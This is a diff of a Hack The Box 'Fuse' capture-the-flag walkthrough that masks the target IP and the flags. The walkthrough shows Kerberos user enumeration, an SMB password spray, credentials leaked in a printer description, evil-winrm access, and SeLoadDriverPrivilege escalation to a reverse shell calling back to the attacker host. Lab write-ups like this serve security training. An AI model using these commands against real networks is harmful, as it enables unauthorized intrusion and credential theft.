@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Fuse
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-fuse-infocard.png)
-
 This medium-difficulty Windows machine gave me a chance to exploit a vulnerable service that we hear of often in training as being an overlooked problem for many Enterprises: printer management.  While this challenge did not involve exploiting an actual print spooler service, it drew attention to the problems that misconfigurations can cause especially when dealing with credentialed service accounts.
 
 You may see me using Metasploit more starting from this machine. I recently went through a class where we used it quite a bit, so I learned that it isn't as bad as I thought and can even help workflow in some cases. I am probably still going to avoid easy-button exploits unless crunched for time \(always depending on what is available!\). It's about the learning journey, not the end result of capturing the flags.
@@ -29,13 +27,13 @@ For this machine I tried using the Three Ms \(tm\) a bit more than usual, to som
 
 #### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.193`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ nmap -n -v -p- -sCV -oA fuse 10.10.10.193    
+└─$ nmap -n -v -p- -sCV -oA fuse <YOUR_IP>    
 
-Nmap scan report for 10.10.10.193
+Nmap scan report for <YOUR_IP>
 Host is up (0.044s latency).
 Not shown: 65514 filtered ports
 PORT      STATE SERVICE      VERSION
@@ -137,28 +135,28 @@ I found six potential usernames \(including `bnielson` in one of the document ti
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > run
-[*] Running module against 10.10.10.193
+[*] Running module against <YOUR_IP>
 
 [*] Validating options...
 [*] Using domain: FABRICORP...
-[*] 10.10.10.193:88 - Testing User: "pmerton"...
-[*] 10.10.10.193:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.193:88 - User: "pmerton" is present
-[*] 10.10.10.193:88 - Testing User: "tlavel"...
-[*] 10.10.10.193:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.193:88 - User: "tlavel" is present
-[*] 10.10.10.193:88 - Testing User: "sthompson"...
-[*] 10.10.10.193:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.193:88 - User: "sthompson" is present
-[*] 10.10.10.193:88 - Testing User: "bhult"...
-[*] 10.10.10.193:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.193:88 - User: "bhult" is present
-[*] 10.10.10.193:88 - Testing User: "administrator"...
-[*] 10.10.10.193:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.193:88 - User: "administrator" is present
-[*] 10.10.10.193:88 - Testing User: "bnielson"...
-[*] 10.10.10.193:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.193:88 - User: "bnielson" is present
+[*] <YOUR_IP>:88 - Testing User: "pmerton"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "pmerton" is present
+[*] <YOUR_IP>:88 - Testing User: "tlavel"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "tlavel" is present
+[*] <YOUR_IP>:88 - Testing User: "sthompson"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "sthompson" is present
+[*] <YOUR_IP>:88 - Testing User: "bhult"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "bhult" is present
+[*] <YOUR_IP>:88 - Testing User: "administrator"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "administrator" is present
+[*] <YOUR_IP>:88 - Testing User: "bnielson"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "bnielson" is present
 [*] Auxiliary module execution complete
 ```
 
@@ -213,7 +211,7 @@ Module options (auxiliary/scanner/smb/smb_login):
    PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
    Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
    RECORD_GUEST       false            no        Record guest-privileged random logins to the database
-   RHOSTS             10.10.10.193     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RHOSTS             <YOUR_IP>     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT              445              yes       The SMB service port (TCP)
    SMBDomain          .                no        The Windows domain to use for authentication
    SMBPass                             no        The password for the specified username
@@ -233,14 +231,14 @@ msf5 auxiliary(scanner/smb/smb_login) > set smbdomain FABRICORP
 smbdomain => FABRICORP
 msf5 auxiliary(scanner/smb/smb_login) > run
 
-[*] 10.10.10.193:445      - 10.10.10.193:445 - Starting SMB login bruteforce
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\tlavel:Fabricorp01'
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\bhult:Fabricorp01'
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\administrator:Fabricorp01',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\bnielson:Fabricorp01'
-[*] 10.10.10.193:445      - Scanned 1 of 1 hosts (100% complete)
+[*] <YOUR_IP>:445      - <YOUR_IP>:445 - Starting SMB login bruteforce
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\tlavel:Fabricorp01'
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\bhult:Fabricorp01'
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\administrator:Fabricorp01',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\bnielson:Fabricorp01'
+[*] <YOUR_IP>:445      - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 
@@ -248,17 +246,17 @@ After running the `smb_login` scanner I found that not only had one person used 
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ smbclient -U "FABRICORP\bnielson" -L \\\\10.10.10.193\\
+└─$ smbclient -U "FABRICORP\bnielson" -L \\\\<YOUR_IP>\\
 Enter FABRICORP\bnielson's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ smbclient -U "FABRICORP\tlavel" -L \\\\10.10.10.193\\                                           1 ⨯
+└─$ smbclient -U "FABRICORP\tlavel" -L \\\\<YOUR_IP>\\                                           1 ⨯
 Enter FABRICORP\tlavel's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ smbclient -U "FABRICORP\bhult" -L \\\\10.10.10.193\\                                            1 ⨯
+└─$ smbclient -U "FABRICORP\bhult" -L \\\\<YOUR_IP>\\                                            1 ⨯
 Enter FABRICORP\bhult's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 ```
@@ -292,11 +290,11 @@ I checked the man page for `smbpasswd` to see what the `-r` and `-U` options did
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ smbpasswd -r 10.10.10.193 -U bnielson                                                           1 ⨯
+└─$ smbpasswd -r <YOUR_IP> -U bnielson                                                           1 ⨯
 Old SMB password: Fabricorp01
 New SMB password: test
 Retype new SMB password: test
-machine 10.10.10.193 rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..
+machine <YOUR_IP> rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..
 ```
 
 I used this to try to change the password for `bnielson`, but it seemed as if there were some sort of password complexity rules in place. 
@@ -307,7 +305,7 @@ The passwords will not show up on the screen like in my output above and below. 
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ smbpasswd -r 10.10.10.193 -U bnielson                                                         
+└─$ smbpasswd -r <YOUR_IP> -U bnielson                                                         
 Old SMB password: Fabricorp01
 New SMB password: $Up3rC0mp13xP@$$w0rd
 Retype new SMB password: $Up3rC0mp13xP@$$w0rd
@@ -322,7 +320,7 @@ If you change a user's password, and find that after a minute or so that your pa
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ smbclient -U "bnielson" -L \\\\10.10.10.193\\ 
+└─$ smbclient -U "bnielson" -L \\\\<YOUR_IP>\\ 
 Enter WORKGROUP\bnielson's password: 
 
         Sharename       Type      Comment
@@ -341,7 +339,7 @@ Next I used my new password for `bnielson` to enumerate open SMB shares. Besides
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ rpcclient -U bnielson 10.10.10.193   
+└─$ rpcclient -U bnielson <YOUR_IP>   
 Enter WORKGROUP\bnielson's password: 
 
 rpcclient $> enumdomusers
@@ -405,7 +403,7 @@ rpcclient $> lsaaddacctrights 0x451 SeDebugPrivilege
 result was NT_STATUS_NONE_MAPPED
 
 rpcclient $> srvinfo
-        10.10.10.193   Wk Sv PDC Tim PrQ NT 
+        <YOUR_IP>   Wk Sv PDC Tim PrQ NT 
         platform_id     :       500
         os version      :       10.0
         server type     :       0x80122b
@@ -463,7 +461,6 @@ group:[Key Admins] rid:[0x20e]
 group:[Enterprise Key Admins] rid:[0x20f]
 group:[DnsUpdateProxy] rid:[0x44e]
 group:[IT_Accounts] rid:[0x644]
-
 
 rpcclient $> querygroupmem 0x200
         rid:[0x1f4] attr:[0x7]
@@ -545,8 +542,8 @@ rpcclient $> getusrdompwinfo 0x641
 
 rpcclient $> enumprinters
         flags:[0x800000]
-        name:[\\10.10.10.193\HP-MFT01]
-        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+        name:[\\<YOUR_IP>\HP-MFT01]
+        description:[\\<YOUR_IP>\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
         comment:[]
 ```
 
@@ -555,56 +552,56 @@ After enumerating the machine through RPC with `rpcclient` for awhile and findin
 ```text
 msf5 auxiliary(scanner/smb/smb_login) > run
 
-[*] 10.10.10.193:445      - 10.10.10.193:445 - Starting SMB login bruteforce
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\pmerton:$fab@s3Rv1ce$1',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\tlavel:Fabricorp01'
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\sthompson:$fab@s3Rv1ce$1',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\bhult:Fabricorp01'
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\administrator:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\administrator:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\administrator:$fab@s3Rv1ce$1',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\bnielson:Fabricorp01'
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\Administrator:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\Administrator:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\Administrator:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\Guest:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\Guest:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\Guest:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\krbtgt:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\krbtgt:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\krbtgt:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\DefaultAccount:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\DefaultAccount:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\DefaultAccount:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\svc-print:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\svc-print:Fabricorp01',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\svc-print:$fab@s3Rv1ce$1'
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\sthompson:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\pmerton:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\svc-scan:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\svc-scan:Fabricorp01',
-[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'FABRICORP\svc-scan:$fab@s3Rv1ce$1'
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\dandrews:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\dandrews:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\dandrews:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\mberbatov:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\mberbatov:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\mberbatov:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\astein:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\astein:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\astein:$fab@s3Rv1ce$1',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\dmuir:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\dmuir:Fabricorp01',
-[-] 10.10.10.193:445      - 10.10.10.193:445 - Failed: 'FABRICORP\dmuir:$fab@s3Rv1ce$1',
-[*] 10.10.10.193:445      - Scanned 1 of 1 hosts (100% complete)
+[*] <YOUR_IP>:445      - <YOUR_IP>:445 - Starting SMB login bruteforce
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\pmerton:$fab@s3Rv1ce$1',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\tlavel:Fabricorp01'
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\sthompson:$fab@s3Rv1ce$1',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\bhult:Fabricorp01'
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\administrator:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\administrator:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\administrator:$fab@s3Rv1ce$1',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\bnielson:Fabricorp01'
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\Administrator:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\Administrator:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\Administrator:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\Guest:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\Guest:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\Guest:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\krbtgt:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\krbtgt:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\krbtgt:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\DefaultAccount:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\DefaultAccount:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\DefaultAccount:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\svc-print:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\svc-print:Fabricorp01',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\svc-print:$fab@s3Rv1ce$1'
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\sthompson:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\sthompson:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\pmerton:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\pmerton:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\svc-scan:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\svc-scan:Fabricorp01',
+[+] <YOUR_IP>:445      - <YOUR_IP>:445 - Success: 'FABRICORP\svc-scan:$fab@s3Rv1ce$1'
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\dandrews:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\dandrews:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\dandrews:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\mberbatov:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\mberbatov:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\mberbatov:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\astein:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\astein:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\astein:$fab@s3Rv1ce$1',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\dmuir:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\dmuir:Fabricorp01',
+[-] <YOUR_IP>:445      - <YOUR_IP>:445 - Failed: 'FABRICORP\dmuir:$fab@s3Rv1ce$1',
+[*] <YOUR_IP>:445      - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 
@@ -618,7 +615,7 @@ I tried using the winrm enumeration module in metasploit, but for some reason it
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193 -P 5985                             
+└─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i <YOUR_IP> -P 5985                             
 
 Evil-WinRM shell v2.3
 
@@ -633,7 +630,6 @@ USER INFORMATION
 User Name           SID
 =================== ==============================================
 fabricorp\svc-print S-1-5-21-2633719317-1471316042-3957863514-1104
-
 
 GROUP INFORMATION
 -----------------
@@ -652,7 +648,6 @@ FABRICORP\IT_Accounts                      Group            S-1-5-21-2633719317-
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -663,7 +658,6 @@ SeLoadDriverPrivilege         Load and unload device drivers Enabled
 SeShutdownPrivilege           Shut down the system           Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -709,17 +703,14 @@ C:\USERS
 *Evil-WinRM* PS C:\users> cd svc-print/Desktop
 *Evil-WinRM* PS C:\users\svc-print\Desktop> ls
 
-
     Directory: C:\users\svc-print\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        9/25/2020   1:23 PM             34 user.txt
 
-
 *Evil-WinRM* PS C:\users\svc-print\Desktop> type user.txt
-cea534708fb5e5dc92920ad8473e6553
+****
 ```
 
 `tree` gave some odd looking output, but showed me that the `user.txt` proof was right there in my service account user's Desktop! \(Why a service account has a Desktop I am not sure...\)
@@ -810,7 +801,7 @@ I decided that since the service account had the `SeLoadDriverPrivilege` privile
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
-└─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193 -P 5985                             1 ⨯
+└─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i <YOUR_IP> -P 5985                             1 ⨯
 
 Evil-WinRM shell v2.3
 
@@ -818,7 +809,6 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\svc-print\Documents> upload print.exe
 Info: Uploading print.exe to C:\Users\svc-print\Documents\print.exe
-
 
 Data: 98400 bytes of 98400 bytes copied
 
@@ -877,7 +867,6 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
     294      15     8788      17968              2992   0 WmiPrvSE
     663      26    52092      66048       0.47   4000   0 wsmprovhost
 
-
 *Evil-WinRM* PS C:\Users\svc-print\Documents> Stop-Process -Name print
 ```
 
@@ -892,7 +881,6 @@ Module options (exploit/windows/local/capcom_sys_exec):
    ----     ---------------  --------  -----------
    SESSION  4                yes       The session to run this module on.
 
-
 Payload options (windows/x64/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -900,7 +888,6 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     tun0             yes       The listen address (an interface may be specified)
    LPORT     43242            yes       The listen port
-
 
 Exploit target:
 
@@ -989,7 +976,6 @@ Module options (exploit/multi/handler):
    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
 
-
 Payload options (windows/x64/shell_reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -997,7 +983,6 @@ Payload options (windows/x64/shell_reverse_tcp):
    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     10.10.15.74      yes       The listen address (an interface may be specified)
    LPORT     55541            yes       The listen port
-
 
 Exploit target:
 
@@ -1008,7 +993,7 @@ Exploit target:
 msf5 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 10.10.15.74:55541 
-[*] Command shell session 5 opened (10.10.15.74:55541 -> 10.10.10.193:64733) at 2020-09-26 17:26:09 -0400
+[*] Command shell session 5 opened (10.10.15.74:55541 -> <YOUR_IP>:64733) at 2020-09-26 17:26:09 -0400
 
 C:\temp>whoami /all
 whoami /all
@@ -1020,7 +1005,6 @@ User Name           SID
 =================== ========
 nt authority\system S-1-5-18
 
-
 GROUP INFORMATION
 -----------------
 
@@ -1030,7 +1014,6 @@ BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by 
 Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
 Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1089,13 +1072,9 @@ dir
 
 c:\Users\Administrator\Desktop>type root.txt
 type root.txt
-995555f7516045d9982eafbe2b0d6944
+****
 ```
 
 {% hint style="info" %}
 I didn't remember this until after I was doing my write-up, but I totally forgot to finish exploiting this machine.  I had found out while enumerating through RPC that the user **`sthompson`** was a Domain Administrator, so this should have been my end goal.  If you get this far, try to see if you can go for the king of the hill and fully compromise this \(non-existent\) domain!
 {% endhint %}
-
-Thanks to [`egre55`](https://app.hackthebox.eu/users/1190) for creating this fairly easy but interesting machine.  It is always nice to encounter challenges that introduce new privileges to take advantage of!
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
